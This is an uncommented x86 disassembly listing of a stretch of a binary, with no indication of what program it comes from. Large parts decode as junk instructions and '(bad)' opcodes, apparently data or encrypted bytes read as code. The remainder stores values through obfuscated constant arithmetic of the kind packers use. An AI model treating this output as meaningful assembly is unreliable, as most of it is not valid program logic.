  4108ee:	sbb    bh,cl
  4108f0:	out    dx,al
  4108f1:	loopne 0x410923
  4108f3:	jg     0x4108c0
  4108f5:	(bad)  
  4108f6:	stc    
  4108f7:	outs   dx,DWORD PTR ds:[esi]
  4108f8:	add    DWORD PTR ds:0xd86a,eax
  4108fd:	and    eax,DWORD PTR [ebx+0xf52af6f]
  410903:	js     0x41088f
  410905:	mov    ah,0x10
  410907:	fadd   DWORD PTR [ebp+0x4c52d42a]
  41090d:	dec    ebx
  41090e:	xchg   edi,eax
  41090f:	std    
  410910:	test   DWORD PTR [edi-0x40eadcb8],ebp
  410916:	jmp    0x4108ba
  410918:	push   edx
  410919:	ret    0xd3b
  41091c:	in     eax,dx
  41091d:	jbe    0x4108e1
  41091f:	mov    ch,0xbe
  410921:	ret    0x663f
  410924:	fidiv  DWORD PTR [esi-0x730391b1]
  41092a:	sbb    BYTE PTR [edx-0x3f],cl
  41092d:	cmp    BYTE PTR [edi-0x436b26e9],0x48
  410934:	test   al,0xdf
  410936:	jle    0x410990
  410938:	push   0x2
  41093a:	mov    edi,0xb82c487e
  41093f:	mul    BYTE PTR [ecx]
  410941:	inc    eax
  410942:	cmc    
  410943:	cli    
  410944:	outs   dx,BYTE PTR ds:[esi]
  410945:	call   0x65ac6efd
  41094a:	sbb    dh,ah
  41094c:	ds push eax
  41094e:	jae    0x4109a6
  410950:	push   esi
  410951:	push   esi
  410952:	addr16 pop ecx
  410954:	enter  0x929d,0x18
  410958:	rol    esp,cl
  41095a:	(bad)  [eax]
  41095c:	outs   dx,BYTE PTR ds:[esi]
  41095d:	in     al,dx
  41095e:	adc    edx,eax
  410960:	mov    edi,DWORD PTR [eax-0x1dd06b41]
  410966:	mov    WORD PTR [ebp-0x26673c9c],ss
  41096c:	cmp    al,BYTE PTR [edi-0x1a]
  41096f:	es aas 
  410971:	call   0x1bb2:0xfecdfc1d
  410978:	adc    DWORD PTR [ebx+0x345eb59b],ebp
  41097e:	lds    ebp,FWORD PTR [ebx+eiz*2-0x456966c8]
  410985:	int3   
  410986:	mul    edi
  410988:	push   edx
  410989:	mov    edx,0x93664174
  41098e:	mov    eax,0xcfcff603
  410993:	push   eax
  410994:	add    DWORD PTR [edi-0x6e666ae3],ebp
  41099a:	inc    esp
  41099b:	push   ebp
  41099c:	(bad)  
  41099d:	jmp    0x5a440cbe
  4109a2:	loop   0x410a1e
  4109a4:	test   al,0x63
  4109a6:	cwde   
  4109a7:	call   0x3354:0xadcf2b0b
  4109ae:	dec    eax
  4109af:	call   0x9423828
  4109b4:	sbb    eax,0x159dfdfe
  4109b9:	call   0x0:0x58c40d28
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x422072
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x422072
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0x7ee1f8b8
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [edi],bh
  410a7d:	pusha  
  410a7e:	sub    eax,0xd7e960f9
  410a83:	and    BYTE PTR [esi],ah
  410a85:	cmp    bl,BYTE PTR [edi]
  410a87:	cmp    eax,0x9a7224e3
  410a8c:	(bad)  
  410a8d:	dec    ecx
  410a8e:	sar    BYTE PTR [edx+0x53680614],1
  410a94:	mov    edi,0x7fab5dc5
  410a99:	adc    BYTE PTR [ebx+0x362d5e47],0x99
  410aa0:	cld    
  410aa1:	xlat   BYTE PTR ds:[ebx]
  410aa2:	ins    DWORD PTR es:[edi],dx
  410aa3:	dec    edx
  410aa4:	(bad)  
  410aa5:	retf   
  410aa6:	push   esi
  410aa7:	daa    
  410aa8:	test   eax,0xc8de013a
  410aad:	xchg   ah,cl
  410aaf:	stos   DWORD PTR es:[edi],eax
  410ab0:	sbb    al,0xe9
  410ab2:	push   ss
  410ab3:	leave  
  410ab4:	stos   BYTE PTR es:[edi],al
  410ab5:	inc    eax
  410ab6:	sub    BYTE PTR [edi+eiz*2+0x64],0x28
  410abb:	stc    
  410abc:	and    al,0xbe
  410abe:	lahf   
  410abf:	push   esi
  410ac0:	jmp    0x168f:0x411c
  410ac6:	imul   eax,DWORD PTR [edi-0x147fc8cd],0xffffff8e
  410acd:	frstor [ebx+0x45d62bf4]
  410ad3:	adc    WORD PTR [edx],ax
  410ad6:	repz test eax,0xcdf440d7
  410adc:	jmp    0x2b1364e3
  410ae1:	xchg   DWORD PTR [ebx],eax
  410ae3:	cdq    
  410ae4:	mov    DWORD PTR [edi],ebx
  410ae6:	int3   
  410ae7:	or     al,0x56
  410ae9:	lahf   
  410aea:	shl    cl,cl
  410aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aed:	adc    eax,0xe833e3d2
  410af2:	inc    esp
  410af3:	call   0x1ff9:0x6e2ae099
  410afa:	cmp    DWORD PTR [esi+0x34],ecx
  410afd:	pop    esi
  410afe:	sbb    eax,0x3342c0ff
  410b03:	sbb    BYTE PTR [ecx],bh
  410b05:	dec    esp
  410b06:	pop    esi
  410b07:	inc    ebp
  410b08:	ds jb  0x410b30
  410b0b:	push   es
  410b0c:	in     al,0xef
  410b0e:	pop    esp
  410b0f:	xor    eax,0xea7334a4
  410b14:	in     al,dx
  410b15:	add    ecx,0x77747be9
  410b1b:	test   al,0xed
  410b1d:	mov    edx,0x5c2a65c3
  410b22:	push   ss
  410b23:	mov    cl,0xad
  410b25:	cmp    al,0x49
  410b27:	stos   DWORD PTR es:[edi],eax
  410b28:	mov    DWORD PTR [ebx+0x5d],esp
  410b2b:	data16 icebp 
  410b2d:	cld    
  410b2e:	or     ecx,esp
  410b30:	add    DWORD PTR [esi],0xd6db1bc3
  410b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b37:	in     eax,dx
  410b38:	inc    esp
  410b39:	inc    eax
  410b3a:	mov    bl,0x50
  410b3c:	psrld  mm2,QWORD PTR [ebx]
  410b3f:	lods   eax,DWORD PTR ds:[esi]
  410b40:	add    al,0xd
  410b42:	jo     0x410bc1
  410b44:	icebp  
  410b45:	test   edx,eax
  410b47:	inc    ecx
  410b48:	fs jae 0x410b2f
  410b4b:	enter  0xb06d,0x25
  410b4f:	mov    DWORD PTR cs:[edx-0x40],edi
  410b53:	jne    0x410af0
  410b55:	xchg   ecx,eax
  410b56:	test   BYTE PTR [ebp+ebx*1-0x51],dh
  410b5a:	push   0x6c850ea6
  410b5f:	adc    eax,0x8d989369
  410b65:	mov    esi,0x38ce88e3
  410b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b6b:	in     al,0x62
  410b6d:	sub    BYTE PTR [ebp+0x3a],ah
  410b70:	and    BYTE PTR [edx+0x12],dl
  410b73:	push   cs
  410b74:	loope  0x410bb3
  410b76:	cli    
  410b77:	sbb    eax,0x5fd18af
  410b7c:	aad    0xdd
  410b7e:	dec    edi
  410b7f:	out    0x73,al
  410b81:	scas   eax,DWORD PTR es:[edi]
  410b82:	xlat   BYTE PTR ds:[ebx]
  410b83:	nop
  410b84:	xchg   esp,eax
  410b85:	dec    edi
  410b86:	dec    esi
  410b87:	push   eax
  410b88:	inc    ecx
  410b89:	aad    0x9c
  410b8b:	xchg   esp,eax
  410b8c:	xor    BYTE PTR [edi-0x26],0x60
  410b90:	inc    esp
  410b91:	xlat   BYTE PTR ds:[ebx]
  410b92:	mov    bh,0x8c
  410b94:	rcl    DWORD PTR [eax+0x27609be6],cl
  410b9a:	inc    ebx
  410b9b:	mov    dl,0x34
  410b9d:	ror    DWORD PTR fs:[ecx],1
  410ba0:	fsub   DWORD PTR [edx]
  410ba2:	neg    DWORD PTR ds:0x1f79c415
  410ba8:	mov    eax,edx
  410baa:	inc    ebx
  410bab:	add    ecx,DWORD PTR [ecx+0x7cb33a22]
  410bb1:	stc    
  410bb2:	sbb    al,0x7e
  410bb4:	mov    ebp,0x8582d78b
  410bb9:	int    0x56
  410bbb:	nop
  410bbc:	out    0x97,eax
  410bbe:	out    0x8b,al
  410bc0:	mov    cs,ecx
  410bc2:	ds xchg edi,eax
  410bc4:	pop    eax
  410bc5:	xchg   edx,eax
  410bc6:	add    DWORD PTR [ebx+0x5d],ebx
  410bc9:	repnz xchg esi,eax
  410bcb:	rol    BYTE PTR [ecx+ebp*4-0x6ae8ae28],1
  410bd2:	inc    esi
  410bd3:	cmp    al,0x12
  410bd5:	push   0xffffffad
  410bd7:	or     al,0xf3
  410bd9:	rcr    bh,1
  410bdb:	and    eax,0x5b9374f2
  410be0:	inc    DWORD PTR [edi+0x2e]
  410be3:	das    
  410be4:	jp     0x410bea
  410be6:	inc    edi
  410be7:	fldcw  WORD PTR [edi]
  410be9:	jle    0x410b74
  410beb:	int3   
  410bec:	adc    esp,ebp
  410bee:	mov    cl,0x69
  410bf0:	mov    ebp,0x6ceb9a97
  410bf5:	and    ebx,DWORD PTR [ebx+0x45b5b46c]
  410bfb:	mov    bh,0xfb
  410bfd:	shl    al,0xb0
  410c00:	mov    ecx,esp
  410c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c03:	sahf   
  410c04:	xor    DWORD PTR [edx+0x7d],esp
  410c07:	adc    dl,BYTE PTR [ebp+0x54]
  410c0a:	inc    ebp
  410c0b:	aam    0x11
  410c0d:	and    BYTE PTR ds:0x96b113f6,cl
  410c13:	mov    ah,0x70
  410c15:	pop    es
  410c16:	xchg   BYTE PTR [ecx],al
  410c18:	sub    al,0x65
  410c1a:	cdq    
  410c1b:	mov    ds:0x944e1596,al
  410c20:	popa   
  410c21:	or     DWORD PTR [edi+eiz*8-0xa],edx
  410c25:	lea    eax,[edi-0x6ca16f60]
  410c2b:	setne  BYTE PTR [ebp+0x71]
  410c2f:	dec    edi
  410c30:	sub    BYTE PTR [edi-0xc],bl
  410c33:	mov    ah,0x9f
  410c35:	push   ebx
  410c36:	gs sbb al,0x59
  410c39:	stos   BYTE PTR es:[edi],al
  410c3a:	push   ebp
  410c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c3c:	dec    edi
  410c3d:	dec    ebx
  410c3e:	inc    esp
  410c3f:	push   esp
  410c40:	rol    BYTE PTR [edx+eax*8],cl
  410c43:	mov    ds:0x7685615d,eax
  410c48:	sti    
  410c49:	mov    ch,0x49
  410c4b:	cdq    
  410c4c:	or     DWORD PTR [edi+0x20c15bf7],edx
  410c52:	ja     0x410bd9
  410c54:	scas   al,BYTE PTR es:[edi]
  410c55:	pop    ecx
  410c56:	fimul  WORD PTR [ecx-0xcfac364]
  410c5c:	in     al,0xfd
  410c5e:	mov    WORD PTR [edi],cs
  410c60:	sub    ebp,ecx
  410c62:	repnz cmc 
  410c64:	shr    al,0x8f
  410c67:	int    0xfd
  410c69:	aam    0xd2
  410c6b:	mov    DWORD PTR [eax+0x2c8f0ed8],esp
  410c71:	test   DWORD PTR [ebp+0x32],eax
  410c74:	enter  0x7900,0x88
  410c78:	xchg   edx,eax
  410c79:	dec    ebp
  410c7a:	adc    eax,DWORD PTR [ebp+0x37]
  410c7d:	test   al,0x81
  410c7f:	in     eax,dx
  410c80:	sub    DWORD PTR [esi+0x435c919c],ecx
  410c86:	ins    DWORD PTR es:[edi],dx
  410c87:	adc    eax,0x69aba439
  410c8c:	push   ds
  410c8d:	inc    ebp
  410c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c8f:	or     al,0x3a
  410c91:	and    BYTE PTR [edx-0x3e565cc4],cl
  410c97:	adc    eax,0x927660a0
  410c9c:	xchg   BYTE PTR [ecx+0x35],ah
  410c9f:	add    DWORD PTR [ebx],edx
  410ca1:	sahf   
  410ca2:	cmp    BYTE PTR [eax-0x2ee94373],al
  410ca8:	(bad)  
  410ca9:	(bad)  [eax-0x55]
  410cac:	pusha  
  410cad:	test   ebp,eax
  410caf:	adc    DWORD PTR [ebp+0x28],ebp
  410cb2:	out    0x4f,al
  410cb4:	retf   0x73a6
  410cb7:	xlat   BYTE PTR ds:[ebx]
  410cb8:	pop    DWORD PTR [ebp-0x4a]
  410cbb:	popf   
  410cbc:	mov    esi,0x8317d3be
  410cc1:	cmp    DWORD PTR [edi+eax*4],esi
  410cc4:	fucomp st(7)
  410cc6:	dec    esi
  410cc7:	cwde   
  410cc8:	call   0x7ee7:0xe402b97
  410ccf:	cmp    al,cl
  410cd1:	sub    esp,DWORD PTR [edi+0x7d]
  410cd4:	in     eax,0x5b
  410cd6:	(bad)  
  410cd7:	aas    
  410cd8:	fnsave [esi-0x322e8ee6]
  410cde:	dec    ebp
  410cdf:	mov    edx,0xdae12e3
  410ce4:	stos   DWORD PTR es:[edi],eax
  410ce5:	xchg   edi,eax
  410ce6:	xchg   DWORD PTR [edi],ecx
  410ce8:	cld    
  410ce9:	lahf   
  410cea:	fucom  st(5)
  410cec:	xor    ah,0xe4
  410cef:	je     0x410d01
  410cf1:	jp     0x410d2f
  410cf3:	pop    ebp
  410cf4:	mov    al,0x25
  410cf6:	adc    al,0xb3
  410cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cf9:	clc    
  410cfa:	xchg   esp,eax
  410cfb:	mov    edx,0x20cad7f2
  410d00:	pop    eax
  410d01:	push   0x3bb2a68c
  410d06:	jl     0x410ccd
  410d08:	div    BYTE PTR [edi]
  410d0a:	push   0xffffffc1
  410d0c:	es ja  0x410d87
  410d0f:	sbb    eax,0x3f9509dd
  410d14:	sbb    esp,esi
  410d16:	jnp    0x410d64
  410d18:	mov    ch,BYTE PTR [ebx+esi*8]
  410d1b:	aaa    
  410d1c:	jl     0x410d54
  410d1e:	xchg   ecx,eax
  410d1f:	add    al,0xda
  410d21:	mov    gs,esi
  410d23:	es out dx,al
  410d25:	dec    esi
  410d26:	adc    BYTE PTR [esi-0x79953684],bl
  410d2c:	(bad)  
  410d2d:	lock les edx,FWORD PTR [ebp+0x1f]
  410d31:	(bad)  
  410d32:	imul   eax
  410d34:	out    0x69,eax
  410d36:	loop   0x410cf3
  410d38:	pop    ebx
  410d39:	xor    DWORD PTR [eax],esp
  410d3b:	xchg   esi,eax
  410d3c:	sbb    ebp,ecx
  410d3e:	mov    cl,0x89
  410d40:	jge    0x410d3e
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0x4c
  410d65:	pushf  
  410d66:	mov    eax,ds:0x18826d70
  410d6b:	sbb    BYTE PTR [edx-0x50e7e7ec],bl
  410d71:	dec    edi
  410d72:	xor    BYTE PTR [eax],dh
  410d74:	adc    bh,BYTE PTR [eax-0x28]
  410d77:	dec    eax
  410d78:	dec    esp
  410d79:	jge    0x410db0
  410d7b:	loop   0x410df3
  410d7d:	cmp    esi,ebx
  410d7f:	js     0x410d10
  410d81:	mov    WORD PTR [eax],es
  410d83:	fdiv   DWORD PTR [eax+edx*1-0x1e]
  410d87:	add    bl,BYTE PTR [esi-0x370dc3f]
  410d8d:	sbb    eax,0x7a0060a8
  410d92:	pand   mm1,QWORD PTR [ebx+0x77]
  410d96:	push   ecx
  410d97:	pop    ebp
  410d98:	dec    eax
  410d99:	pop    edx
  410d9a:	sbb    DWORD PTR [ebp-0x4c],esi
  410d9d:	mov    esp,DWORD PTR [eax]
  410d9f:	jmp    0x807bf80f
  410da4:	mov    cl,0x41
  410da6:	jle    0x410dbf
  410da8:	mov    eax,ds:0x408a9c40
  410dad:	mov    DWORD PTR [esi-0x2fb8d725],edi
  410db3:	pop    ebp
  410db4:	mov    BYTE PTR [edi+eax*1-0x70],ah
  410db8:	fistp  QWORD PTR [esi+0x53]
  410dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dbc:	cld    
  410dbd:	dec    ebx
  410dbe:	inc    edi
  410dbf:	sbb    al,0xf8
  410dc1:	xchg   BYTE PTR [edx],bl
  410dc3:	mov    ah,0x9d
  410dc5:	cmp    bl,BYTE PTR [esi+0x6c]
  410dc8:	fisub  DWORD PTR [ebx-0x5da18a8f]
  410dce:	mov    ecx,0xc82d8096
  410dd3:	push   ss
  410dd4:	neg    DWORD PTR [ecx+0x363cf878]
  410dda:	ror    BYTE PTR [ebx-0x64b8cf8b],0x87
  410de1:	dec    ebx
  410de2:	mov    cl,0x9f
  410de4:	push   ds
  410de5:	retf   
  410de6:	out    dx,al
  410de7:	je     0x410dd1
  410de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dea:	cmp    DWORD PTR [eax+0x59488cdb],esp
  410df0:	pop    edi
  410df1:	or     DWORD PTR [edx+ebp*8-0x4b53bec],0x59
  410df9:	jno    0x410dec
  410dfb:	loop   0x410dbf
  410dfd:	add    ebp,DWORD PTR ds:0xf1534bd1
  410e03:	bound  ebp,QWORD PTR [eax-0x5beedbff]
  410e09:	ins    DWORD PTR es:[edi],dx
  410e0a:	cdq    
  410e0b:	cwde   
  410e0c:	mov    ecx,0xd938f6d7
  410e11:	shr    BYTE PTR [eax],0x3b
  410e14:	sti    
  410e15:	sub    esp,DWORD PTR [edx-0x7]
  410e18:	js     0x410e7c
  410e1a:	jg     0x410e85
  410e1c:	ins    DWORD PTR es:[edi],dx
  410e1d:	xor    cl,BYTE PTR [esp+ebp*1-0x4c]
  410e21:	mov    ebx,0x2cf59a10
  410e26:	mov    dh,0x51
  410e28:	mov    bh,BYTE PTR [ebp-0x243faa6f]
  410e2e:	inc    ebp
  410e2f:	mov    ecx,0x6a014275
  410e34:	add    ch,0x44
  410e37:	sub    edi,ecx
  410e39:	xor    ebx,esi
  410e3b:	shr    DWORD PTR ds:0x5ec5216e,0xd4
  410e42:	aam    0xc8
  410e44:	ss xchg ah,dh
  410e47:	repz cmp edi,edx
  410e4a:	push   edx
  410e4b:	das    
  410e4c:	sub    esi,esi
  410e4e:	cmp    al,0x8a
  410e50:	sbb    eax,0xdb97b138
  410e55:	rcr    BYTE PTR [edi],1
  410e57:	sbb    dl,al
  410e59:	rcr    DWORD PTR [ecx-0x65],1
  410e5c:	mov    ds:0x4acf87a1,al
  410e61:	add    ebx,ecx
  410e63:	jno    0x410df3
  410e65:	shr    ah,1
  410e67:	popa   
  410e68:	mov    al,ds:0x8ff61b22
  410e6d:	pop    edi
  410e6e:	mov    eax,esi
  410e70:	xor    eax,0x4841c89f
  410e75:	mov    al,ds:0x3f617f46
  410e7a:	fild   QWORD PTR [edx+0x73]
  410e7d:	mov    ch,0x29
  410e7f:	sub    al,0x53
  410e81:	std    
  410e82:	jl     0x410e18
  410e84:	int3   
  410e85:	mov    bl,0xb7
  410e87:	mov    ebp,0xd5ae36eb
  410e8c:	clc    
  410e8d:	cli    
  410e8e:	mov    bh,0xc2
  410e90:	cmp    BYTE PTR [ecx],bh
  410e92:	ins    BYTE PTR es:[edi],dx
  410e93:	sti    
  410e94:	mov    dl,0xb7
  410e96:	sbb    BYTE PTR ds:0x745d88b0,cl
  410e9c:	jge    0x410e95
  410e9e:	or     esi,esp
  410ea0:	fsub   QWORD PTR [esi+0x646c69db]
  410ea6:	dec    edx
  410ea7:	clc    
  410ea8:	inc    esp
  410ea9:	mov    cl,0x47
  410eab:	imul   ebx,DWORD PTR [ecx-0x1802af32],0x57
  410eb2:	(bad)  
  410eb3:	into   
  410eb4:	jo     0x410ece
  410eb6:	add    al,0x64
  410eb8:	retf   0x4d0e
  410ebb:	in     eax,dx
  410ebc:	inc    esi
  410ebd:	lods   al,BYTE PTR ds:[esi]
  410ebe:	add    al,0x87
  410ec0:	arpl   WORD PTR [edi],dx
  410ec2:	jg     0x410e6c
  410ec4:	push   es
  410ec5:	in     eax,dx
  410ec6:	jnp    0x410ec7
  410ec8:	dec    esi
  410ec9:	in     al,0x2c
  410ecb:	fstp   TBYTE PTR [eax]
  410ecd:	sub    DWORD PTR [ebx],eax
  410ecf:	xor    BYTE PTR [edx],0xbb
  410ed2:	pop    es
  410ed3:	push   ds
  410ed4:	cmp    bl,BYTE PTR [edx+ecx*4-0x71]
  410ed8:	cmp    al,0xfb
  410eda:	repz sti 
  410edc:	mov    cs:0x73b4c23d,al
  410ee2:	mov    ebx,0xccb0a78e
  410ee7:	cmp    al,dl
  410ee9:	jle    0x410e7b
  410eeb:	jb     0x410f67
  410eed:	hlt    
  410eee:	mov    al,0xe6
  410ef0:	sbb    edi,esp
  410ef2:	fsub   QWORD PTR [edx]
  410ef4:	sub    BYTE PTR [eax+0x74adecbe],cl
  410efa:	ret    0xf7b0
  410efd:	in     eax,0xcd
  410eff:	outs   dx,DWORD PTR ds:[esi]
  410f00:	sbb    DWORD PTR [ebx+0x1d],edx
  410f03:	ss scas al,BYTE PTR es:[edi]
  410f05:	or     BYTE PTR ds:0xe6a95074,bl
  410f0b:	jnp    0x410f81
  410f0d:	std    
  410f0e:	js     0x410f64
  410f10:	pop    ds
  410f11:	jb     0x410eb2
  410f13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f14:	jecxz  0x410ec0
  410f16:	xchg   BYTE PTR [edi],ah
  410f18:	neg    dh
  410f1a:	xor    eax,0xb3d2076e
  410f1f:	not    DWORD PTR [eax-0x45]
  410f22:	pop    ds
  410f23:	lea    esi,ds:0x486a4e78
  410f29:	es inc edx
  410f2b:	in     eax,dx
  410f2c:	pushf  
  410f2d:	fmul   QWORD PTR [edi+0x6f]
  410f30:	mov    edi,0xd176a745
  410f35:	cs push ebp
  410f37:	mov    esp,0xc3cdb44d
  410f3c:	icebp  
  410f3d:	arpl   sp,si
  410f3f:	ret    0x2cda
  410f42:	addr16 (bad) 
  410f45:	push   ss
  410f46:	pop    esp
  410f47:	xor    esp,DWORD PTR [edi+0x10]
  410f4a:	aaa    
  410f4b:	dec    ecx
  410f4c:	push   0x8e2352ae
  410f51:	test   eax,0x810e7054
  410f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f57:	gs hlt 
  410f59:	xchg   DWORD PTR [eax+ebp*8+0x2531f617],eax
  410f60:	jge    0x410fd8
  410f62:	pop    eax
  410f63:	ss cmp esp,ebx
  410f66:	sar    ebx,cl
  410f68:	pushf  
  410f69:	leave  
  410f6a:	aam    0x21
  410f6c:	or     esp,DWORD PTR ds:0x95f60365
  410f72:	repz xor al,0x22
  410f75:	not    edi
  410f77:	pop    ebp
  410f78:	(bad)  
  410f79:	xor    bl,bl
  410f7b:	mov    bl,0xf1
  410f7d:	jl     0x410fd4
  410f7f:	aad    0x82
  410f81:	cmp    al,0x27
  410f83:	(bad)  
  410f84:	out    0xf5,al
  410f86:	pop    ss
  410f87:	repz popa 
  410f89:	add    DWORD PTR [eax],edx
  410f8b:	(bad)  
  410f8d:	xor    eax,0x620688fa
  410f92:	cld    
  410f93:	mov    ds:0x560bd2,eax
  410f98:	pop    edx
  410f99:	mov    ?,WORD PTR [esi+edi*8+0x1f]
  410f9d:	jle    0x410f89
  410f9f:	lock mov gs,WORD PTR [ecx+edi*4-0x41]
  410fa4:	jl     0x410fae
  410fa6:	aas    
  410fa7:	mov    edi,0x4d5be813
  410fac:	pop    esp
  410fad:	mov    eax,0x1d3809b5
  410fb2:	addr16 gs jae 0x41101c
  410fb6:	ins    BYTE PTR es:[edi],dx
  410fb7:	add    bl,BYTE PTR [eax]
  410fb9:	or     al,0xa4
  410fbb:	sub    ecx,edi
  410fbd:	sti    
  410fbe:	stos   DWORD PTR es:[edi],eax
  410fbf:	call   0xc2f7:0xc531c74a
  410fc6:	mov    dl,0x2e
  410fc8:	adc    DWORD PTR [ecx],eax
  410fca:	cmp    bl,ch
  410fcc:	jbe    0x410f89
  410fce:	sub    edi,DWORD PTR [edx]
  410fd0:	stos   BYTE PTR es:[edi],al
  410fd1:	mov    ah,0xc3
  410fd3:	jb     0x410faf
  410fd5:	push   0xffffffe8
  410fd7:	push   esi
  410fd8:	in     eax,dx
  410fd9:	sti    
  410fda:	scas   eax,DWORD PTR es:[edi]
  410fdb:	out    dx,eax
  410fdc:	(bad)  
  410fdd:	ror    BYTE PTR [ebx+0x499d54d8],cl
  410fe3:	cld    
  410fe4:	in     al,dx
  410fe5:	mov    ah,0x7e
  410fe7:	mov    cl,0xcb
  410fe9:	imul   edx,DWORD PTR [ebp+0x16af2746],0x1d
  410ff0:	push   ebx
  410ff1:	arpl   cx,si
  410ff3:	call   0x107c:0xc1c3d133
  410ffa:	or     dl,cl
  410ffc:	fild   QWORD PTR [esi-0x69]
  410fff:	into   
  411000:	mov    eax,0xdf997302
  411005:	test   DWORD PTR [edx+edi*2-0x994331f],0x13103d3b
  411010:	ror    DWORD PTR [ebx*1-0x33e781ae],cl
  411017:	fs jne 0x411009
  41101a:	dec    ebp
  41101b:	(bad)  
  41101c:	pop    edx
  41101d:	mov    eax,ds:0x4281a34e
  411022:	sub    DWORD PTR [eax-0x6a],0x8d30d7ca
  411029:	into   
  41102a:	xchg   edx,eax
  41102b:	xchg   BYTE PTR [esi],dl
  41102d:	clc    
  41102e:	or     DWORD PTR [edi+0x7d],edi
  411031:	inc    edi
  411032:	mov    ecx,DWORD PTR gs:[ebp-0x4]
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
